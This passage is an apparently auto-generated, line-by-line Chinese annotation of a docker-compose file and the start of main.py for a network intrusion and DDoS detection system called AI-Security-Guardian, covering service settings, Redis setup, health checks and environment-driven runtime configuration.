| 56 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      redis:` |
| 57 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `        condition: service_healthy` |
| 58 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    mem_limit: 2g` |
| 59 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    mem_reservation: 512m` |
| 60 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    cpus: 2.0` |
| 61 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    security_opt:` |
| 62 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - no-new-privileges:true` |
| 63 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    read_only: false` |
| 64 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    healthcheck:` |
| 65 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      test:` |
| 66 | YAML 列表项：声明集合中的一个配置值。 | `        - CMD-SHELL` |
| 67 | YAML 列表项：声明集合中的一个配置值。 | `        - >` |
| 68 | 配置行：参与项目启动、部署或依赖定义。 | `          python -c "import urllib.request;` |
| 69 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `          assert urllib.request.urlopen('http://127.0.0.1:5000/healthz', timeout=5).status == 200"` |
| 70 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      interval: 30s` |
| 71 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      timeout: 10s` |
| 72 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      retries: 3` |
| 73 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      start_period: 30s` |
| 74 | 空行：分隔配置段。 | `&nbsp;` |
| 75 | 配置注释：解释配置项用途。 | `  # -------------------------------------------------------------------` |
| 76 | 配置注释：解释配置项用途。 | `  # 完整检测链路（Phase 8 主入口 main.py）` |
| 77 | 配置注释：解释配置项用途。 | `  # 默认不启动；执行 \`docker compose --profile full-chain up\` 才会拉起。` |
| 78 | 配置注释：解释配置项用途。 | `  # 它会：` |
| 79 | 配置注释：解释配置项用途。 | `  #   - 运行真实抓包（需要 CAP_NET_RAW / CAP_NET_ADMIN；network_mode: host）` |
| 80 | 配置注释：解释配置项用途。 | `  #   - 监听 /var/log/nginx/access.log（如需采集 Web 日志，按需挂载进来）` |
| 81 | 配置注释：解释配置项用途。 | `  #   - 把告警通过 push_alert 广播到 app 的 Phase 7 WebSocket` |
| 82 | 配置注释：解释配置项用途。 | `  # -------------------------------------------------------------------` |
| 83 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `  guardian:` |
| 84 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    image: ai-security-guardian:latest` |
| 85 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    container_name: ai-security-guardian-main` |
| 86 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    restart: unless-stopped` |
| 87 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    profiles:` |
| 88 | YAML 列表项：声明集合中的一个配置值。 | `      - full-chain` |
| 89 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    env_file:` |
| 90 | YAML 列表项：声明集合中的一个配置值。 | `      - .env` |
| 91 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    environment:` |
| 92 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      FLASK_ENV: ${FLASK_ENV:-production}` |
| 93 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_HOST: ${REDIS_HOST_FOR_GUARDIAN:-127.0.0.1}` |
| 94 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_PORT: "6379"` |
| 95 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_PASSWORD: ${REDIS_PASSWORD:-}` |
| 96 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      DRY_RUN: ${DRY_RUN:-true}` |
| 97 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      ENABLE_PACKET_CAPTURE: "true"` |
| 98 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      ENABLE_WEB_LOG: ${ENABLE_WEB_LOG:-false}` |
| 99 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      ENABLE_FLASK: "false"  # 告警通过 Redis 队列共享给 app，不在此进程起 Flask` |
| 100 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      LOG_LEVEL: ${LOG_LEVEL:-INFO}` |
| 101 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      PACKET_INTERFACE: ${PACKET_INTERFACE:-}` |
| 102 | 配置注释：解释配置项用途。 | `    # 抓包必须能看到宿主机的真实网卡：host 网络是最简单可靠的做法。` |
| 103 | 配置注释：解释配置项用途。 | `    # 若不想用 host 网络，需要显式 cap_add + network: bridge，但 bridge 内只能` |
| 104 | 配置注释：解释配置项用途。 | `    # 看到容器间流量，对真实网卡的 DDoS 检测意义有限。` |
| 105 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    network_mode: host` |
| 106 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    cap_add:` |
| 107 | YAML 列表项：声明集合中的一个配置值。 | `      - NET_ADMIN` |
| 108 | YAML 列表项：声明集合中的一个配置值。 | `      - NET_RAW` |
| 109 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    command: ["python", "main.py"]` |
| 110 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    volumes:` |
| 111 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - ./models/saved:/app/models/saved:ro` |
| 112 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - ./logs:/app/logs` |
| 113 | 配置注释：解释配置项用途。 | `      # 如需采集宿主机 Web 日志，取消下一行的注释并按实际路径调整：` |
| 114 | 配置注释：解释配置项用途。 | `      # - /var/log/nginx:/var/log/nginx:ro` |
| 115 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    depends_on:` |
| 116 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      redis:` |
| 117 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `        condition: service_healthy` |
| 118 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      app:` |
| 119 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `        condition: service_started` |
| 120 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    mem_limit: 2g` |
| 121 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    cpus: 2.0` |
| 122 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    security_opt:` |
| 123 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - no-new-privileges:true` |
| 124 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    healthcheck:` |
| 125 | 配置注释：解释配置项用途。 | `      # guardian 没有 HTTP，使用进程存活 + Redis 可达作为健康信号` |
| 126 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      test:` |
| 127 | YAML 列表项：声明集合中的一个配置值。 | `        - CMD-SHELL` |
| 128 | YAML 列表项：声明集合中的一个配置值。 | `        - pgrep -f "python main.py" >/dev/null 2>&1` |
| 129 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      interval: 30s` |
| 130 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      timeout: 5s` |
| 131 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      retries: 3` |
| 132 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      start_period: 30s` |
| 133 | 空行：分隔配置段。 | `&nbsp;` |
| 134 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `  redis:` |
| 135 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    image: redis:7-alpine` |
| 136 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    container_name: ai-security-guardian-redis` |
| 137 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    restart: unless-stopped` |
| 138 | 配置注释：解释配置项用途。 | `    # 仅绑定 127.0.0.1，不向公网 0.0.0.0 暴露；供本机 Guardian（host 网络）访问。` |
| 139 | 配置注释：解释配置项用途。 | `    # 纯 bridge 内访问可删除 ports 段并改用 profile「dev-publish-redis」（见 docs/deployment.md）。` |
| 140 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    ports:` |
| 141 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - "127.0.0.1:6379:6379"` |
| 142 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    environment:` |
| 143 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_PASSWORD: ${REDIS_PASSWORD:-}` |
| 144 | 配置注释：解释配置项用途。 | `    # 有 REDIS_PASSWORD 时才启用 --requirepass；空密码时不在命令行写入弱口令` |
| 145 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    command:` |
| 146 | YAML 列表项：声明集合中的一个配置值。 | `      - /bin/sh` |
| 147 | YAML 列表项：声明集合中的一个配置值。 | `      - -c` |
| 148 | YAML 列表项：声明集合中的一个配置值。 | `      - \|` |
| 149 | 配置行：参与项目启动、部署或依赖定义。 | `        set -eu` |
| 150 | 配置行：参与项目启动、部署或依赖定义。 | `        if [ -n "$${REDIS_PASSWORD}" ]; then` |
| 151 | 配置行：参与项目启动、部署或依赖定义。 | `          exec redis-server --requirepass "$${REDIS_PASSWORD}" --maxmemory 256mb --maxmemory-policy allkeys-lru --save "" --appendonly no` |
| 152 | 配置行：参与项目启动、部署或依赖定义。 | `        else` |
| 153 | 配置行：参与项目启动、部署或依赖定义。 | `          exec redis-server --maxmemory 256mb --maxmemory-policy allkeys-lru --save "" --appendonly no` |
| 154 | 配置行：参与项目启动、部署或依赖定义。 | `        fi` |
| 155 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    volumes:` |
| 156 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - redis_data:/data` |
| 157 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    mem_limit: 512m` |
| 158 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    cpus: 1.0` |
| 159 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    security_opt:` |
| 160 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - no-new-privileges:true` |
| 161 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    healthcheck:` |
| 162 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      test:` |
| 163 | YAML 列表项：声明集合中的一个配置值。 | `        - CMD-SHELL` |
| 164 | YAML 列表项：声明集合中的一个配置值。 | `        - >` |
| 165 | 配置行：参与项目启动、部署或依赖定义。 | `          if [ -n "$${REDIS_PASSWORD}" ]; then` |
| 166 | 配置行：参与项目启动、部署或依赖定义。 | `            redis-cli -a "$${REDIS_PASSWORD}" ping \| grep -q PONG;` |
| 167 | 配置行：参与项目启动、部署或依赖定义。 | `          else` |
| 168 | 配置行：参与项目启动、部署或依赖定义。 | `            redis-cli ping \| grep -q PONG;` |
| 169 | 配置行：参与项目启动、部署或依赖定义。 | `          fi` |
| 170 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      interval: 10s` |
| 171 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      timeout: 5s` |
| 172 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      retries: 5` |
| 173 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      start_period: 5s` |
| 174 | 空行：分隔配置段。 | `&nbsp;` |
| 175 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `volumes:` |
| 176 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `  redis_data:` |
| 177 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    driver: local` |

## `main.py`

- 类型：后端主入口
- 行数：836

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `AI-Security-Guardian 主入口（Phase 8：集成与部署）` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §11 部署架构 + Phase 8 提示词 A 节（主入口集成）` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `本模块的职责：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    1. 初始化全部核心模块（采集 / 特征 / 检测 / 融合 / 响应 / 审计）` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    2. 串联完整检测流水线（数据包、Web 日志两条入口）` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    3. **威胁情报前置过滤**：在特征提取与模型推理前先查黑名单` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    4. 模型加载采用"单模型失败不拖垮整体"的容错策略` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    5. 融合决策对结果进行投票 / 加权，单引擎异常不影响其他引擎` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    6. 可选：接入 Phase 7 Flask 工厂（\`web.app.create_app\`）与前端联动` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    7. Redis 作为缓存 / 轻量消息队列；Redis 不可用时自动降级到内存` |
| 13 | 函数调用：执行已有函数/方法完成当前步骤。 | `    8. 优雅关闭：SIGINT / SIGTERM 统一走 shutdown() 清理` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `设计约束：` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 不重做 Phase 0 ~ Phase 7 的任何现有模块` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - Docker 容器默认入口仍是 \`python -m web.app\`（Web/API 层，无需 root）` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 本文件作为"完整检测链路"入口：\`python main.py\`，需要抓包权限时使用` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 所有密钥 / Redis 密码 / 管理员密码 / API Key 必须来自环境变量` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 任何一个子模块异常都不应该导致进程退出；记录日志并继续主循环` |
| 21 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 22 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import argparse` |
| 25 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 26 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 27 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import signal` |
| 28 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 29 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 30 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 31 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 32 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 33 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 34 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timezone` |
| 35 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Optional` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 注释：解释下面或当前这段代码的设计意图。 | `# 核心模块（复用 Phase 1-6 的现有实现）` |
| 38 | 导入对象：从指定模块引入类、函数或常量。 | `from src.audit.security_logger import SecurityLogger` |
| 39 | 导入对象：从指定模块引入类、函数或常量。 | `from src.observability.guardian_metrics import GuardianMetricsCollector` |
| 40 | 导入对象：从指定模块引入类、函数或常量。 | `from src.registry import ModelRegistry` |
| 41 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.log_collector import LogCollector` |
| 42 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.packet_collector import PacketCollector` |
| 43 | 导入对象：从指定模块引入类、函数或常量。 | `from src.collectors.threat_intel import ThreatIntelCollector` |
| 44 | 导入对象：从指定模块引入类、函数或常量。 | `from src.decision.fusion_engine import FusionEngine` |
| 45 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.anomaly_detector import AnomalyDetector` |
| 46 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.base import DetectionResult` |
| 47 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.ddos_detector import DDoSDetector` |
| 48 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.intrusion_detector import IntrusionDetector` |
| 49 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.web_detector import WebAttackDetector` |
| 50 | 导入对象：从指定模块引入类、函数或常量。 | `from src.features.flow_window_aggregator import (` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowWindowAggregator,` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowWindowAggregatorConfig,` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 54 | 导入对象：从指定模块引入类、函数或常量。 | `from src.features.web_features import WebFeatureExtractor` |
| 55 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.responder import SecurityResponder` |
| 56 | 导入对象：从指定模块引入类、函数或常量。 | `from src.utils.env_loader import load_dotenv_file` |
| 57 | 导入对象：从指定模块引入类、函数或常量。 | `from src.utils.redis_client import RedisClient` |
| 58 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 59 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger("main")` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `load_dotenv_file()` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 65 | 注释：解释下面或当前这段代码的设计意图。 | `# 运行时配置（从环境变量读取，避免硬编码）` |
| 66 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 67 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 68 | 类定义：声明 `RuntimeConfig`，封装相关状态与行为。 | `class RuntimeConfig:` |
| 69 | 文档字符串：说明当前模块、类或函数的职责。 | `    """主入口运行期配置。所有字段都可被环境变量覆盖。"""` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    dry_run: bool = True` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    enable_packet_capture: bool = True` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    enable_web_log: bool = True` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    enable_flask: bool = False` |
| 75 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    packet_interface: Optional[str] = None` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    web_log_path: str = "/var/log/nginx/access.log"` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    loop_interval_sec: float = 1.0` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    max_packets_per_tick: int = 50` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 注释：解释下面或当前这段代码的设计意图。 | `    # 实时流聚合（network_flow_v1 / FlowWindowAggregator）` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flow_min_packets: int = 2` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flow_idle_timeout_sec: float = 5.0` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flow_agg_window_sec: float = 10.0` |
| 85 | 注释：解释下面或当前这段代码的设计意图。 | `    # discard \| emit_low_confidence（单包流空闲超时后策略）` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    single_packet_idle_policy: str = "discard"` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_dir: str = "models/saved"` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    redis_host: str = "localhost"` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    redis_port: int = 6379` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    redis_db: int = 0` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    redis_password: str = ""` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    log_integrity_enabled: bool = True` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    require_redis_available: bool = False` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    require_models_ready: bool = False` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 装饰器：为下面的函数或类附加框架行为。 | `    @classmethod` |
| 98 | 函数定义：声明 `from_env` 的输入、处理逻辑和返回结果。 | `    def from_env(cls) -> "RuntimeConfig":` |
| 99 | 文档字符串：说明当前模块、类或函数的职责。 | `        """读取环境变量，未设置则使用默认值。"""` |
| 100 | 返回结果：把处理后的值交回调用方。 | `        return cls(` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=os.environ.get("DRY_RUN", "true").lower() == "true",` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            enable_packet_capture=os.environ.get(` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "ENABLE_PACKET_CAPTURE", "true"` |
| 104 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ).lower() == "true",` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            enable_web_log=os.environ.get("ENABLE_WEB_LOG", "true").lower()` |
| 106 | 代码语句：参与当前文件的业务流程或数据处理。 | `            == "true",` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            enable_flask=os.environ.get("ENABLE_FLASK", "false").lower()` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `            == "true",` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            packet_interface=os.environ.get("PACKET_INTERFACE") or None,` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            web_log_path=os.environ.get(` |
| 111 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "WEB_LOG_PATH", "/var/log/nginx/access.log"` |
| 112 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            loop_interval_sec=float(os.environ.get("LOOP_INTERVAL_SEC", "1.0")),` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            max_packets_per_tick=int(` |
| 115 | 函数调用：执行已有函数/方法完成当前步骤。 | `                os.environ.get("MAX_PACKETS_PER_TICK", "50")` |
| 116 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_min_packets=int(os.environ.get("FLOW_MIN_PACKETS", "2")),` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_idle_timeout_sec=float(` |
| 119 | 函数调用：执行已有函数/方法完成当前步骤。 | `                os.environ.get("FLOW_IDLE_TIMEOUT_SEC", "5.0")` |
| 120 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flow_agg_window_sec=float(` |
| 122 | 函数调用：执行已有函数/方法完成当前步骤。 | `                os.environ.get("FLOW_AGG_WINDOW_SEC", "10.0")` |
| 123 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            single_packet_idle_policy=os.environ.get(` |
| 125 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "SINGLE_PACKET_IDLE_POLICY", "discard"` |
| 126 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model_dir=os.environ.get("MODEL_DIR", "models/saved"),` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            redis_host=os.environ.get("REDIS_HOST", "localhost"),` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            redis_port=int(os.environ.get("REDIS_PORT", "6379")),` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            redis_db=int(os.environ.get("REDIS_DB", "0")),` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            redis_password=os.environ.get("REDIS_PASSWORD", ""),` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            log_integrity_enabled=os.environ.get(` |
| 133 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "LOG_INTEGRITY_ENABLED", "true"` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ).lower() == "true",` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            require_redis_available=os.environ.get(` |
| 136 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "REQUIRE_REDIS_AVAILABLE", "false"` |
| 137 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ).lower()` |
| 138 | 代码语句：参与当前文件的业务流程或数据处理。 | `            == "true",` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            require_models_ready=os.environ.get(` |
| 140 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "REQUIRE_MODELS_READY", "false"` |
| 141 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ).lower()` |
| 142 | 代码语句：参与当前文件的业务流程或数据处理。 | `            == "true",` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 144 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 145 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 146 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 147 | 注释：解释下面或当前这段代码的设计意图。 | `# 主控制器` |
| 148 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 149 | 类定义：声明 `SecurityGuardian`，封装相关状态与行为。 | `class SecurityGuardian:` |
| 150 | 文档字符串：说明当前模块、类或函数的职责。 | `    """AI 安全守卫主控制器（Phase 8 集成层）。` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 代码语句：参与当前文件的业务流程或数据处理。 | `    关键设计：` |
| 153 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - 所有子模块在构造时即实例化，但**模型加载是延迟的**，` |
| 154 | 代码语句：参与当前文件的业务流程或数据处理。 | `          由 :pymeth:\`load_models\` 统一在主循环前尝试，失败即降级。` |
| 155 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - :pymeth:\`process_packet\` / :pymeth:\`process_packet_batch\` /` |
| 156 | 代码语句：参与当前文件的业务流程或数据处理。 | `          :pymeth:\`process_web_log\` 全部具备容错，单条流量异常不会影响主循环。` |
| 157 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - :pymeth:\`shutdown\` 幂等，可被信号处理器和 finally 同时调用。` |
| 158 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 159 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 160 | 注释：解释下面或当前这段代码的设计意图。 | `    # Redis Streams 通道与容量（所有告警共享，便于多消费者按 group 订阅）` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _ALERT_STREAM: str = "guardian:alerts"` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _ALERT_STREAM_GROUP: str = "guardian:web"` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _ALERT_STREAM_MAXLEN: int = 10_000` |
| 164 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 165 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, cfg: Optional[RuntimeConfig] = None) -> None:` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.cfg: RuntimeConfig = cfg or RuntimeConfig.from_env()` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._running: bool = False` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._shutdown_lock = threading.Lock()` |
| 169 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 170 | 注释：解释下面或当前这段代码的设计意图。 | `        # ---- 审计日志（首先启动，保证后续故障都能留痕）------------------` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.security_logger = SecurityLogger(` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            log_dir="logs", enable_integrity=self.cfg.log_integrity_enabled` |
